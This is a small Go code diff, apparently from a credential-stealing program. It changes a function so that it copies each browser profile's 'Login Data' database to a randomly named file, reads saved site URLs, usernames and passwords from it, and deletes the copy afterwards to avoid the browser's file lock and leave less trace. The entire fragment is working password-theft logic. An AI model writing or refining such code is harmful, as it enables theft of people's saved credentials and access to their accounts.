@@ -31,11 +31,14 @@ func Get() string {
 				continue
 			}
 			path = path + "\\" + profile
-			db, err := sql.Open("sqlite3", path+"\\Login Data")
+			copy_path := path + "\\Login Data" + util.RandomName()
+			util.CopyFileKDOT(path+"\\Login Data", copy_path)
+			db, err := sql.Open("sqlite3", copy_path)
 			if err != nil {
 				continue
 			}
 			defer db.Close()
+			defer os.Remove(copy_path)
 
 			row, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
 			if err != nil {
